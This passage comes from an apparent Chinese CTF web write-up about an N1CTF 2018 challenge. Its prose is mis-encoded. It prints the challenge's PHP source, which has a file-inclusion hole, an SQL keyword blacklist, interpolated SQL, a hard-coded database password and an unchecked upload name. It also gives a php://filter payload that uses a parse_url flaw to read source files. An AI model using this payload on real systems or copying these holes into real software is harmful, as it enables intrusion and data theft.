string">"Location: user.php?page=info"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token keyword">include</span> <span class="token double-quoted-string string">"templates/index.html"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span></code></pre><p>å†è¯»ä¸€ä¸‹user.php</p><p><code>user.php</code></p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">require_once</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"function.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span> <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'user'</span><span class="token punctuation">]</span> <span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">Header</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"Location: index.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'isadmin'</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token single-quoted-string string">'1'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$oper_you_can_do</span> <span class="token operator">=</span> <span class="token variable">$OPERATE_admin</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token variable">$oper_you_can_do</span> <span class="token operator">=</span> <span class="token variable">$OPERATE</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">//die($_SESSION['isadmin']);</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'isadmin'</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token single-quoted-string string">'1'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'page'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'page'</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token single-quoted-string string">''</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$page</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'info'</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$page</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'page'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'page'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">||</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'page'</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token single-quoted-string string">''</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$page</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'guest'</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$page</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'page'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$page</span> <span class="token operator">===</span> <span class="token single-quoted-string string">'info'</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span><span class="token comment">//            echo("&lt;script>alert('no premission to visit info, only admin can, you are guest')&lt;/script>");</span>            <span class="token function">Header</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"Location: user.php?page=guest"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token function">filter_directory</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//if(!in_array($page,$oper_you_can_do))&#123;</span><span class="token comment">//    $page = 'info';</span><span class="token comment">//&#125;</span><span class="token keyword">include</span> <span class="token double-quoted-string string">"<span class="token interpolation"><span class="token variable">$page</span></span>.php"</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre><p>å†è¯»ä¸€ä¸‹function.php</p><p><code>function.php</code></p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">require_once</span> <span class="token double-quoted-string string">"config.php"</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function">Hacker</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">Header</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"Location: hacker.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function">filter_directory</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$keywords</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token double-quoted-string string">"flag"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"manage"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"ffffllllaaaaggg"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$uri</span> <span class="token operator">=</span> <span class="token function">parse_url</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token double-quoted-string string">"REQUEST_URI"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">parse_str</span><span class="token punctuation">(</span><span class="token variable">$uri</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'query'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$query</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//    var_dump($query);</span><span class="token comment">//    die();</span>    <span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$keywords</span> <span class="token keyword">as</span> <span class="token variable">$token</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$query</span> <span class="token keyword">as</span> <span class="token variable">$k</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token variable">$v</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">stristr</span><span class="token punctuation">(</span><span class="token variable">$k</span><span class="token punctuation">,</span> <span class="token variable">$token</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                <span class="token function">hacker</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">stristr</span><span class="token punctuation">(</span><span class="token variable">$v</span><span class="token punctuation">,</span> <span class="token variable">$token</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                <span class="token function">hacker</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function">filter_directory_guest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$keywords</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token double-quoted-string string">"flag"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"manage"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"ffffllllaaaaggg"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"info"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$uri</span> <span class="token operator">=</span> <span class="token function">parse_url</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token double-quoted-string string">"REQUEST_URI"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">parse_str</span><span class="token punctuation">(</span><span class="token variable">$uri</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'query'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$query</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//    var_dump($query);</span><span class="token comment">//    die();</span>    <span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$keywords</span> <span class="token keyword">as</span> <span class="token variable">$token</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$query</span> <span class="token keyword">as</span> <span class="token variable">$k</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token variable">$v</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">stristr</span><span class="token punctuation">(</span><span class="token variable">$k</span><span class="token punctuation">,</span> <span class="token variable">$token</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                <span class="token function">hacker</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">stristr</span><span class="token punctuation">(</span><span class="token variable">$v</span><span class="token punctuation">,</span> <span class="token variable">$token</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                <span class="token function">hacker</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function">Filter</span><span class="token punctuation">(</span><span class="token variable">$string</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">global</span> <span class="token variable">$mysqli</span><span class="token punctuation">;</span>    <span class="token variable">$blacklist</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"information|benchmark|order|limit|join|file|into|execute|column|extractvalue|floor|update|insert|delete|username|password"</span><span class="token punctuation">;</span>    <span class="token variable">$whitelist</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'(),_*`-@=+>&lt;"</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$string</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strpos</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"<span class="token interpolation"><span class="token variable">$whitelist</span></span>"</span><span class="token punctuation">,</span> <span class="token variable">$string</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token boolean constant">false</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token function">Hacker</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"/<span class="token interpolation"><span class="token variable">$blacklist</span></span>/is"</span><span class="token punctuation">,</span> <span class="token variable">$string</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">Hacker</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">is_string</span><span class="token punctuation">(</span><span class="token variable">$string</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token variable">$mysqli</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">real_escape_string</span><span class="token punctuation">(</span><span class="token variable">$string</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token double-quoted-string string">""</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function">sql_query</span><span class="token punctuation">(</span><span class="token variable">$sql_query</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">global</span> <span class="token variable">$mysqli</span><span class="token punctuation">;</span>    <span class="token variable">$res</span> <span class="token operator">=</span> <span class="token variable">$mysqli</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">query</span><span class="token punctuation">(</span><span class="token variable">$sql_query</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token variable">$res</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function">login</span><span class="token punctuation">(</span><span class="token variable">$user</span><span class="token punctuation">,</span> <span class="token variable">$pass</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$user</span> <span class="token operator">=</span> <span class="token function">Filter</span><span class="token punctuation">(</span><span class="token variable">$user</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$pass</span> <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$pass</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"select * from `albert_users` where `username_which_you_do_not_know`= '<span class="token interpolation"><span class="token variable">$user</span></span>' and `password_which_you_do_not_know_too` = '<span class="token interpolation"><span class="token variable">$pass</span></span>'"</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token variable">$sql</span><span class="token punctuation">;</span>    <span class="token variable">$res</span> <span class="token operator">=</span> <span class="token function">sql_query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//    var_dump($res);</span><span class="token comment">//    die();</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$res</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">num_rows</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token variable">$res</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">fetch_array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'user'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$data</span><span class="token punctuation">[</span>username_which_you_do_not_know<span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'login'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>        <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'isadmin'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$data</span><span class="token punctuation">[</span>isadmin_which_you_do_not_know_too_too<span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token boolean constant">true</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token boolean constant">false</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function">updateadmin</span><span class="token punctuation">(</span><span class="token variable">$level</span><span class="token punctuation">,</span><span class="token variable">$user</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"update `albert_users` set `isadmin_which_you_do_not_know_too_too` = '<span class="token interpolation"><span class="token variable">$level</span></span>' where `username_which_you_do_not_know`='<span class="token interpolation"><span class="token variable">$user</span></span>' "</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token variable">$sql</span><span class="token punctuation">;</span>    <span class="token variable">$res</span> <span class="token operator">=</span> <span class="token function">sql_query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//    var_dump($res);</span><span class="token comment">//    die();</span><span class="token comment">//    die($res);</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$res</span> <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token boolean constant">true</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token boolean constant">false</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function">register</span><span class="token punctuation">(</span><span class="token variable">$user</span><span class="token punctuation">,</span> <span class="token variable">$pass</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">global</span> <span class="token variable">$mysqli</span><span class="token punctuation">;</span>    <span class="token variable">$user</span> <span class="token operator">=</span> <span class="token function">Filter</span><span class="token punctuation">(</span><span class="token variable">$user</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$pass</span> <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$pass</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"insert into `albert_users`(`username_which_you_do_not_know`,`password_which_you_do_not_know_too`,`isadmin_which_you_do_not_know_too_too`) VALUES ('<span class="token interpolation"><span class="token variable">$user</span></span>','<span class="token interpolation"><span class="token variable">$pass</span></span>','0')"</span><span class="token punctuation">;</span>    <span class="token variable">$res</span> <span class="token operator">=</span> <span class="token function">sql_query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token variable">$mysqli</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">insert_id</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function">logout</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">session_destroy</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">Header</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"Location: index.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span></code></pre><p>å°±è¿™æ ·æ ¹æ®æºç çš„æ•°æ®â€¦è¯»åˆ°äº†ä»¥ä¸‹ç•Œé¢</p><p><code>config.php</code></p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token constant">E_ERROR</span> <span class="token operator">|</span> <span class="token constant">E_WARNING</span> <span class="token operator">|</span> <span class="token constant">E_PARSE</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">define</span><span class="token punctuation">(</span><span class="token constant">BASEDIR</span><span class="token punctuation">,</span> <span class="token double-quoted-string string">"/var/www/html/"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">define</span><span class="token punctuation">(</span><span class="token constant">FLAG_SIG</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$OPERATE</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'userinfo'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'upload'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'search'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$OPERATE_admin</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'userinfo'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'upload'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'search'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'manage'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$DBHOST</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"localhost"</span><span class="token punctuation">;</span><span class="token variable">$DBUSER</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"root"</span><span class="token punctuation">;</span><span class="token variable">$DBPASS</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"Nu1LCTF2018!@#qwe"</span><span class="token punctuation">;</span><span class="token comment">//$DBPASS = "";</span><span class="token variable">$DBNAME</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"N1CTF"</span><span class="token punctuation">;</span><span class="token variable">$mysqli</span> <span class="token operator">=</span> @<span class="token keyword">new</span> <span class="token class-name">mysqli</span><span class="token punctuation">(</span><span class="token variable">$DBHOST</span><span class="token punctuation">,</span> <span class="token variable">$DBUSER</span><span class="token punctuation">,</span> <span class="token variable">$DBPASS</span><span class="token punctuation">,</span> <span class="token variable">$DBNAME</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">mysqli_connect_errno</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token double-quoted-string string">"no sql connection"</span><span class="token punctuation">.</span><span class="token function">mysqli_connect_error</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$mysqli</span><span class="token operator">=</span><span class="token constant">null</span><span class="token punctuation">;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span></code></pre><p><code>guest.php</code></p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token constant">FLAG_SIG</span> <span class="token operator">!=</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"you can not visit it directly "</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">include</span> <span class="token double-quoted-string string">"templates/guest.html"</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre><p><code>info.php</code></p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token constant">FLAG_SIG</span> <span class="token operator">!=</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"you can not visit it directly "</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">include</span> <span class="token double-quoted-string string">"templates/info.html"</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre><p><code>ffffllllaaaaggg</code>è¢«è¿‡æ»¤</p><h5 id="åˆ©ç”¨-parse-urlè§£ææ¼æ´"><a href="#åˆ©ç”¨-parse-urlè§£ææ¼æ´" class="headerlink" title="åˆ©ç”¨ parse_urlè§£ææ¼æ´"></a>åˆ©ç”¨ <code>parse_url</code>è§£ææ¼æ´</h5><p> å½“urlç§å‡ºç°ä¸‹é¢è¿™ç§æƒ…å†µçš„urlï¼Œä¼šè§£æé”™è¯¯ï¼Œè¿”å›false<br><code>//user.php?page=php://filter/convert.base64-encode/resource=ffffllllaaaaggg</code> </p><p><code>ffffllllaaaaggg.php</code></p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token constant">FLAG_SIG</span> <span class="token operator">!=</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"you can not visit it directly"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token double-quoted-string string">"you can find sth in m4aaannngggeee"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span></code></pre><p><code>m4aaannngggeee.php</code></p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token constant">FLAG_SIG</span> <span class="token operator">!=</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"you can not visit it directly"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">include</span> <span class="token double-quoted-string string">"templates/upload.html"</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre><p>è®¿é—®<code>./templates/upload.html</code></p><img src="/article/Buuoj-WEB-Write-up/image-20201129211243615.png" class="" title="image-20201129211243615" loading="lazy"><p>èµ¶ç´§ä¸Šä¼ ä¸ªï¼Œç»“æœç™½é«˜å…´ä¸€åœº</p><img src="/article/Buuoj-WEB-Write-up/image-20201129211356792.png" class="" title="image-20201129211356792" loading="lazy"><p>åˆ©ç”¨user.phpå†è¯»<code>upllloadddd.php</code></p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$allowtype</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"gif"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"png"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"jpg"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$size</span> <span class="token operator">=</span> <span class="token number">10000000</span><span class="token punctuation">;</span><span class="token variable">$path</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"./upload_b3bb2cfed6371dfeb2db1dbcceb124d3/"</span><span class="token punctuation">;</span><span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token variable">$path</span><span class="token punctuation">.</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"error:can not move"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token 